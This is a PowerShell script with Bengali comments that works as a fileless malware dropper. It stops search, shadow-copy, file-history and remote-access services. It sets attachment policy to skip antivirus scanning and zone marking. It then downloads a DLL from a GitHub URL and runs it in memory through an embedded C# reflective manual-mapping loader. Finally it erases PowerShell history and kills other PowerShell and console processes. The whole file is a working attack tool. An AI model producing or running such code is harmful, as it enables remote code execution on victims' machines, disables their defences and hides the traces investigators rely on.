Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewerService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

# ==================== পরিবর্তিত অংশ (পুরানো Discord/Explorer ব্লক সরানো হয়েছে) ====================
# DLL টি ডাউনলোড করুন (ডিস্কে সেভ হয় না, শুধু Byte Array হিসেবে মেমোরিতে থাকে)
$url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
$webClient = New-Object System.Net.WebClient
$dllBytes = $webClient.DownloadData($url)

# C# রিফ্লেক্টিভ লোডার (৬৪-বিট সাপোর্ট সহ, ম্যানুয়াল ম্যাপিং)
$loaderCode = @"
using System;
using System.Runtime.InteropServices;

public static class ManualLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void RtlMoveMemory(IntPtr dest, IntPtr src, int size);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibraryW(string lpFileName);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate bool DllMainDelegate(IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved);

    public static void Load(byte[] rawBytes)
    {
        GCHandle pinned = GCHandle.Alloc(rawBytes, GCHandleType.Pinned);
        IntPtr pRaw = pinned.AddrOfPinnedObject();

        // 1. DOS Header চেক
        if (Marshal.ReadInt16(pRaw) != 0x5A4D) { pinned.Free(); return; }
        IntPtr pNt = (IntPtr)(pRaw.ToInt64() + Marshal.ReadInt32((IntPtr)(pRaw.ToInt64() + 0x3C)));
        if (Marshal.ReadInt32(pNt) != 0x00004550) { pinned.Free(); return; }

        // 2. শুধু ৬৪-বিট DLL সাপোর্ট
        IntPtr pOpt = (IntPtr)(pNt.ToInt64() + 0x18);
        if (Marshal.ReadInt16(pOpt) != 0x20b) { pinned.Free(); throw new Exception("শুধু 64-বিট DLL সাপোর্টেড।"); }

        // 3. হেডার ইনফো নিন
        long imageBase = Marshal.ReadInt64((IntPtr)(pOpt.ToInt64() + 0x18));
        int sizeOfImage = Marshal.ReadInt32((IntPtr)(pOpt.ToInt64() + 0x28));
        int sizeOfHeaders = Marshal.ReadInt32((IntPtr)(pOpt.ToInt64() + 0x2C));
        int entryRVA = Marshal.ReadInt32((IntPtr)(pOpt.ToInt64() + 0x10));

        // 4. মেমোরি এলোকেট করুন (প্রিফার্ড বেসে, না হলে যেকোনো জায়গায়)
        IntPtr pBase = VirtualAlloc((IntPtr)imageBase, (uint)sizeOfImage, 0x3000, 0x40);
        if (pBase == IntPtr.Zero) pBase = VirtualAlloc(IntPtr.Zero, (uint)sizeOfImage, 0x3000, 0x40);
        if (pBase == IntPtr.Zero) { pinned.Free(); throw new Exception("VirtualAlloc ব্যর্থ হয়েছে।"); }

        // 5. হেডার ও সেকশন কপি করুন
        RtlMoveMemory(pBase, pRaw, sizeOfHeaders);
        ushort sectionCount = Marshal.ReadInt16((IntPtr)(pNt.ToInt64() + 0x6));
        IntPtr pSection = (IntPtr)(pNt.ToInt64() + 0x18 + Marshal.ReadInt16((IntPtr)(pNt.ToInt64() + 0x14)));
        for (int i = 0; i < sectionCount; i++)
        {
            int virtualAddr = Marshal.ReadInt32((IntPtr)(pSection.ToInt64() + 0xC));
            int rawSize = Marshal.ReadInt32((IntPtr)(pSection.ToInt64() + 0x10));
            int rawAddr = Marshal.ReadInt32((IntPtr)(pSection.ToInt64() + 0x14));
            if (rawSize > 0 && virtualAddr < sizeOfImage)
                RtlMoveMemory((IntPtr)(pBase.ToInt64() + virtualAddr), (IntPtr)(pRaw.ToInt64() + rawAddr), rawSize);
            pSection = (IntPtr)(pSection.ToInt64() + 0x28);
        }

        // 6. রিলোকেশন (বেস অ্যাড্রেস ঠিক করা)
        if (pBase.ToInt64() != imageBase)
        {
            IntPtr pRelocDir = (IntPtr)(pOpt.ToInt64() + 0x70); // 64-বিটে রিলোকেশন ডিরেক্টরি
            uint relocRVA = (uint)Marshal.ReadInt32(pRelocDir);
            uint relocSize = (uint)Marshal.ReadInt32((IntPtr)(pRelocDir.ToInt64() + 4));
            if (relocRVA > 0 && relocSize > 0)
            {
                IntPtr pReloc = (IntPtr)(pBase.ToInt64() + relocRVA);
                long delta = pBase.ToInt64() - imageBase;
                while (relocSize > 0)
                {
                    uint blockRVA = (uint)Marshal.ReadInt32(pReloc);
                    uint blockSize = (uint)Marshal.ReadInt32((IntPtr)(pReloc.ToInt64() + 4));
                    if (blockRVA == 0) break;
                    int entries = (int)((blockSize - 8) / 2);
                    for (int j = 0; j < entries; j++)
                    {
                        ushort entry = (ushort)Marshal.ReadInt16((IntPtr)(pReloc.ToInt64() + 8 + j * 2));
                        uint type = (uint)(entry >> 12);
                        uint offset = (uint)(entry & 0xFFF);
                        if (type == 0xA) // IMAGE_REL_BASED_DIR64
                        {
                            IntPtr patchAddr = (IntPtr)(pBase.ToInt64() + blockRVA + offset);
                            ulong patchVal = (ulong)Marshal.ReadInt64(patchAddr);
                            patchVal = (ulong)(patchVal + (ulong)delta);
                            Marshal.WriteInt64(patchAddr, (long)patchVal);
                        }
                    }
                    relocSize -= blockSize;
                    pReloc = (IntPtr)(pReloc.ToInt64() + blockSize);
                }
            }
        }

        // 7. ইম্পোর্ট রেজলভ করা (এখানে ৮ বাইট থাঙ্ক পড়া হয়েছে, যা আগের এরর ফিক্স করেছে)
        IntPtr pImportDir = (IntPtr)(pOpt.ToInt64() + 0x78); // 64-বিটে ইম্পোর্ট ডিরেক্টরি
        uint importRVA = (uint)Marshal.ReadInt32(pImportDir);
        if (importRVA > 0)
        {
            IntPtr pImportDesc = (IntPtr)(pBase.ToInt64() + importRVA);
            while (true)
            {
                uint descRVA = (uint)Marshal.ReadInt32(pImportDesc);
                if (descRVA == 0) break;
                IntPtr pName = (IntPtr)(pBase.ToInt64() + descRVA);
                string dllName = Marshal.PtrToStringAnsi(pName);
                IntPtr hModule = GetModuleHandle(dllName);
                if (hModule == IntPtr.Zero) hModule = LoadLibraryW(dllName);
                if (hModule != IntPtr.Zero)
                {
                    IntPtr pThunk = (IntPtr)(pBase.ToInt64() + Marshal.ReadInt32((IntPtr)(pImportDesc.ToInt64() + 0x10))); // OriginalFirstThunk
                    IntPtr pIAT = (IntPtr)(pBase.ToInt64() + Marshal.ReadInt32((IntPtr)(pImportDesc.ToInt64() + 0x14))); // FirstThunk
                    while (true)
                    {
                        ulong thunkVal = (ulong)Marshal.ReadInt64(pThunk); // **এখানে ৮ বাইট পড়া হচ্ছে (৬৪-বিট)**
                        if (thunkVal == 0) break;
                        IntPtr pFunc = IntPtr.Zero;
                        if ((thunkVal & 0x8000000000000000) == 0)
                        {
                            uint nameRVA = (uint)thunkVal;
                            IntPtr pImportByName = (IntPtr)(pBase.ToInt64() + nameRVA + 2);
                            string funcName = Marshal.PtrToStringAnsi(pImportByName);
                            pFunc = GetProcAddress(hModule, funcName);
                        }
                        else
                        {
                            uint ordinal = (uint)(thunkVal & 0x7FFFFFFF);
                            pFunc = GetProcAddress(hModule, $"#{ordinal}");
                        }
                        if (pFunc != IntPtr.Zero) Marshal.WriteIntPtr(pIAT, pFunc);
                        pThunk = (IntPtr)(pThunk.ToInt64() + 8);
                        pIAT = (IntPtr)(pIAT.ToInt64() + 8);
                    }
                }
                pImportDesc = (IntPtr)(pImportDesc.ToInt64() + 0x14);
            }
        }

        // 8. DllMain কল করুন (DLL_PROCESS_ATTACH = 1)
        if (entryRVA > 0)
        {
            IntPtr pEntry = (IntPtr)(pBase.ToInt64() + entryRVA);
            DllMainDelegate dllMain = (DllMainDelegate)Marshal.GetDelegateForFunctionPointer(pEntry, typeof(DllMainDelegate));
            dllMain(pBase, 1, IntPtr.Zero);
        }

        pinned.Free();
    }
}
"@

# লোডার কম্পাইল করুন এবং DLL ইনজেক্ট করুন (এরর দেখানোর জন্য Try-Catch)
try {
    Add-Type -TypeDefinition $loaderCode
    [ManualLoader]::Load($dllBytes)
    Write-Host "[+] DLL সফলভাবে মেমোরিতে ইনজেক্ট হয়েছে।" -ForegroundColor Green
}
catch {
    Write-Host "[!] এরর: $_" -ForegroundColor Red
    Write-Host "বিস্তারিত: $($_.Exception.Message)" -ForegroundColor Red
}
# ==================== পরিবর্তিত অংশ শেষ ====================

Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
}

# conhost ও অন্যান্য পাওয়ারশেল কিল করার অংশে এরর এড়ানোর জন্য Try-Catch যোগ করা হলো
try {
    Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
}
catch {}

try {
    Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.Id -ne $PID) {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
}
catch {}

$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (-not (Test-Path $historyPath)) {
    New-Item -Path $historyPath -ItemType File -Force | Out-Null
} else {
    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
}

# === উইন্ডো খোলা রাখার জন্য (হাইড বা এন্ড টাস্ক হবে না) ===
Write-Host "`nDLL টি মেমোরিতে লোড করা হয়েছে। উইন্ডো বন্ধ করতে 'Enter' চাপুন..." -ForegroundColor Yellow
Read-Host
